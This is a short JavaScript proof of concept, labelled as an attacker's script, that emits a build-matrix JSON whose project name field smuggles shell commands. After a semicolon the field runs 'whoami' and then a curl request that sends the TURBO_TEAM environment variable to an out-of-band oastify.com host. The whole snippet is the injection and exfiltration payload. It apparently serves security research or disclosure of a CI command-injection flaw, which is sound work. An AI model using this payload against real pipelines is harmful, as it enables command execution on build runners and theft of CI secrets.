// The "attacker's" version of the script
const matrix = {
  app: [
    // The payload: 'nitro' (to make the cd work), ';', 'whoami'
    { name: 'nitro; whoami; curl "https://w4194oyqst012wbw87nlqlvtgkmfajy8.oastify.com?team=${TURBO_TEAM}"', project: 'whatever-project' },
  ],
};
console.log(JSON.stringify(matrix));
